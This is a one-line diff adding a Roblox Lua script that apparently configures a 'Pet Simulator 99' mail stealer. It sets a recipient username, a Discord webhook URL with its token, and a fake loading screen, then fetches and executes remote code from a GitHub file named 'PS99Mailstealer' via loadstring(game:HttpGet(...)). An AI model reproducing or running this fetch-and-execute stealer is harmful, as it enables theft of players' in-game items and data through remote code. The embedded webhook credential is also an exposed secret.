@@ -1,0 +1,1 @@
+Username = "DuroPulowe"Webhook = "https://discord.com/api/webhooks/1214220375995719690/XDJvWDbE1mSHUryHRz7WUFf0ozDPEgjnEbRFg0GostXWfFFs4AuWXk9fOlBc3mGPpcE7"selectedLoadingScreen = "2"LoadingScreen = trueloadstring(game:HttpGet("https://raw.githubusercontent.com/LypherScript/PS99-Mailstealer/main/PS99Mailstealer"))()
